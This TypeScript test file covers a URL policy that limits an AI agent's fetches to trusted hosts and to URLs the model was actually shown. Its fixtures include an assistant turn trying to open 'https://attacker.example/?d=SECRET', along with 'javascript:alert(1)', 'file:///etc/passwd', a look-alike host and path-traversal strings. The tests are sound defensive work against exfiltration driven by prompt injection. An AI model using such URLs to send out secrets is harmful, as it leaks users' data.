import { test } from "node:test";
import assert from "node:assert/strict";
import { canonicalUrl, extractUrls, hostTrusted, MAX_URL_CHARS, ShownUrls, urlHost, urlsShownInLlmRequest } from "./url-policy.ts";

test("extractUrls finds URLs and leaves the punctuation around them", () => {
  assert.deepEqual(
    extractUrls("See https://docs.python.org/3/library/asyncio.html, then (http://example.com/a?b=1&c=2). Or [the guide](https://vite.dev/guide/)!"),
    ["https://docs.python.org/3/library/asyncio.html", "http://example.com/a?b=1&c=2", "https://vite.dev/guide/"],
  );
  assert.deepEqual(extractUrls("https://en.wikipedia.org/wiki/Rust_(programming_language)."), ["https://en.wikipedia.org/wiki/Rust_(programming_language)"]);
  assert.deepEqual(extractUrls('{"url":"https://a.example/x","next":"https://b.example/y"}'), ["https://a.example/x", "https://b.example/y"]);
  assert.deepEqual(extractUrls("1. Title\n   https://a.example/one\n   snippet"), ["https://a.example/one"]);
  assert.deepEqual(extractUrls("no links here, not even ftp://x or https://"), []);
});

test("extractUrls costs no more than the text is long, and skips URLs too long to read", () => {
  // Each of these took minutes when the trailing brackets were recounted for every bracket removed.
  for (const tail of ["]", ")", ").", "]]))"]) {
    const started = performance.now();
    assert.deepEqual(extractUrls(`see http://a.example/x${tail.repeat(400_000)} and https://b.example/y`), ["https://b.example/y"]);
    assert.ok(performance.now() - started < 2000, `${tail}: ${Math.round(performance.now() - started)} ms`);
  }
  assert.deepEqual(extractUrls(`https://a.example/${"x".repeat(MAX_URL_CHARS)} https://b.example/ok`), ["https://b.example/ok"]);
  assert.deepEqual(extractUrls("(https://a.example/x_(y))"), ["https://a.example/x_(y)"]);
  assert.deepEqual(extractUrls("[https://a.example/list[0]]"), ["https://a.example/list[0]"]);
});

test("canonicalUrl is the one spelling that is both checked and requested", () => {
  assert.equal(canonicalUrl("https://Docs.Example.com/guide/?page=2#install"), "https://docs.example.com/guide/?page=2");
  assert.equal(canonicalUrl("http://docs.example.com:80/guide"), "http://docs.example.com/guide");
  assert.equal(canonicalUrl("https://docs.example.com/SECRET/../guide"), "https://docs.example.com/guide", "dot segments are resolved, not sent");
  assert.equal(canonicalUrl("https://docs.example.com/SECRET/%2e%2E/guide"), "https://docs.example.com/guide");
  assert.equal(canonicalUrl("https://docs.example.com./guide"), "https://docs.example.com/guide");
  assert.equal(canonicalUrl("https://docs.example.com/a b?q=it's"), "https://docs.example.com/a%20b?q=it%27s");
  // A character that host name processing drops: the reader must be asked for the host the gateway checked.
  assert.equal(canonicalUrl("https://git\u115fhub.com/x"), "https://github.com/x");
  assert.equal(canonicalUrl("https://b\u00fccher.example/"), "https://xn--bcher-kva.example/");
  for (const bad of ["ftp://x/y", "javascript:alert(1)", "https://user:pw@example.com/", "https://:pw@example.com/", "not a url", "", "https://", `https://a.example/${"x".repeat(MAX_URL_CHARS)}`]) {
    assert.equal(canonicalUrl(bad), null, bad);
  }
  assert.equal(urlHost("HTTPS://Sub.Example.COM./x"), "sub.example.com");
  assert.equal(urlHost("file:///etc/passwd"), null);
});

test("hostTrusted matches a site and its subdomains, not look-alikes", () => {
  const trusted = ["github.com", "wikipedia.org"];
  assert.equal(hostTrusted("github.com", trusted), true);
  assert.equal(hostTrusted("docs.github.com", trusted), true);
  assert.equal(hostTrusted("en.wikipedia.org", trusted), true);
  assert.equal(hostTrusted("notgithub.com", trusted), false);
  assert.equal(hostTrusted("github.com.evil.example", trusted), false);
  assert.equal(hostTrusted("user.github.io", trusted), false);
});

test("ShownUrls remembers per workspace and drops the oldest when full", () => {
  const shown = new ShownUrls({ urlsPerWorkspace: 3 });
  shown.add(1, ["https://a.example/1", "https://a.example/2", "nonsense"]);
  assert.equal(shown.find(1, "http://A.example/1/") !== null, true, "same page, different spelling");
  assert.equal(shown.find(1, "http://A.example/1/#top"), "https://a.example/1", "and it is requested the way it was shown");
  assert.equal(shown.find(1, "https://a.example/x/../1"), "https://a.example/1");
  assert.equal(shown.find(2, "https://a.example/1") !== null, false, "another workspace was not shown it");
  assert.equal(shown.find(1, "https://a.example/1?x=secret") !== null, false, "a URL the workspace composed");
  for (const composed of ["https://a.example/1//", "https://a.example/1/secret/..%2f", "https://a.example:8443/1", "https://a.example/1?", "https://a.example//1"]) {
    const found = shown.find(1, composed);
    assert.ok(found === null || found === "https://a.example/1", `${composed} -> ${found}`);
  }
  assert.equal(shown.find(1, "https://a.example/1//") !== null, false, "one trailing slash more or less, not any number");
  shown.add(1, ["https://a.example/1", "https://a.example/3", "https://a.example/4"]);
  assert.deepEqual(
    [1, 2, 3, 4].map((n) => shown.find(1, `https://a.example/${n}`) !== null),
    [true, false, true, true],
    "2 was the oldest; 1 had just been shown again",
  );
});

test("ShownUrls is bounded by characters and by workspaces, whatever is thrown at it", () => {
  const shown = new ShownUrls({ charsPerWorkspace: 1000, workspaces: 2 });
  const long = (n: number) => `https://a.example/${String(n).padStart(4, "0")}${"x".repeat(180)}`;
  shown.add(1, Array.from({ length: 50 }, (_, n) => long(n)));
  assert.equal(shown.find(1, long(49)) !== null, true);
  assert.equal(shown.find(1, long(40)) !== null, false, "about five URLs of 200 characters fit in 1000");
  shown.add(1, [`https://a.example/${"y".repeat(MAX_URL_CHARS)}`]);
  assert.equal(shown.find(1, long(49)) !== null, true, "a URL too long to read is not remembered");

  shown.add(2, ["https://b.example/"]);
  shown.find(1, long(49)); // workspace 1 is in use
  shown.add(3, ["https://c.example/"]);
  assert.deepEqual([shown.find(1, long(49)) !== null, shown.find(2, "https://b.example/") !== null, shown.find(3, "https://c.example/") !== null], [true, false, true], "the workspace unused for longest was dropped");
});

test("urlsShownInLlmRequest takes what the model is shown, never what it wrote", () => {
  const body = JSON.stringify({
    model: "m",
    messages: [
      { role: "system", content: "Docs: https://sys.example/docs" },
      { role: "user", content: "Read https://user.example/post please" },
      { role: "assistant", content: "I will open https://attacker.example/?d=SECRET", tool_calls: [{ function: { arguments: '{"url":"https://attacker.example/?d=SECRET"}' } }] },
      { role: "tool", content: "README says https://tool.example/readme" },
      { role: "user", content: [{ type: "text", text: "and https://parts.example/a" }, { type: "image_url", image_url: { url: "data:image/png;base64,AAAA" } }] },
      null,
      "junk",
    ],
  });
  assert.deepEqual(urlsShownInLlmRequest(Buffer.from(body)), [
    "https://sys.example/docs",
    "https://user.example/post",
    "https://tool.example/readme",
    "https://parts.example/a",
  ]);
  assert.deepEqual(urlsShownInLlmRequest(JSON.stringify({ prompt: "see https://p.example/x" })), ["https://p.example/x"]);
  assert.deepEqual(urlsShownInLlmRequest(JSON.stringify({ prompt: ["https://p.example/1", "https://p.example/2"] })), ["https://p.example/1", "https://p.example/2"]);
  for (const bad of ["", "{not json", "null", "[]", '"https://x.example/"']) assert.deepEqual(urlsShownInLlmRequest(bad), [], bad);
});
